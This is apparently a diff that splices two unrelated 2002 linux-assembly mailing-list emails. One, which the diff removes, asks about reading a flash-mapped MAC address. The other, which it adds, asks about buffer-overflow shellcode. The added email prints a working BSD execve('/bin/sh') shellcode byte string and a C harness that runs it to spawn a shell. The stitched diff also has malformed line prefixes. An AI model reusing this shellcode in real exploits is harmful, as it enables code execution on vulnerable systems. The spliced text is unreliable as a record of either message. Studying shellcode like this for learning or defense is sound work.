@@ -1,39 +1,27 @@
-From: Frederic Marmond <fmarmond@eprocess.fr>
-Subject: how can I have access to the memory as in flat mode?
-Date: Sun, 23 Jun 2002 17:13:51 +0200
+From: xlp <xlp@emtel.net.co>
+Subject: shellcode
+Date: Mon, 24 Jun 2002 00:18:39 -0500
 Sender: linux-assembly-owner@vger.kernel.org
-Message-ID: <3D15E5AF.5010706@eprocess.fr>
-Reply-To: fmarmond@eprocess.fr
+Message-ID: <20020624001839.H342@nietzsche>
 Mime-Version: 1.0
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: 8bit
 Return-path: <linux-assembly-owner@vger.kernel.org>
+Content-Disposition: inline
 List-Id: <linux-assembly.vger.kernel.org>
-Content-Type: text/plain; charset="us-ascii"; format="flowed"
+Content-Type: text/plain; charset="us-ascii"
 To: linux-assembly@vger.kernel.org
 
+hi, i am reading a doc about buffer overflow, and i have some questions, check
++this c code:
+char bsdshell[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+                  "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
+                  "\xb0\x3b\x50\xcd\x80";
+int main() {
+        void (*s)()=(void *)bsdshell;
+        s();
+}
+If i run it, it executes a shell. I'd like to know in what does bsdshell
++contain?, What is it? hexadacimal? how can i get that?, acording to the doc,
++it's the execve for /bin/sh.
 
-Hi,
-
-few days ago, i posted mails to try to know better about linear memory 
-in linux.
-perhapse you've already answer me, but I could'nt see mails from the list...
-So, I managed to make my prog work by using /dev/mem
-it's very ugly, but it worked.
-
-Is there any other way to access somewhere?
-In fact the exact problem is:
-
-on a embeded system, the mac-adress of  eth0 and eth1 are stored in a 
-flash memory, mapped somewhere.
-The 'standard' driver (natsemi) doesn't know this, and try to access to 
-the 'normal' pci network card.
-So, i have to read the mac adress by hand, and modify the value returned 
-by the 'standard' driver.
-
-I know the adress, but I've got seg-faults when trying to access it from 
-the driver (readb, (unsigned char*)0xf8000, ...)
-
-any help?
-
-Fred
 
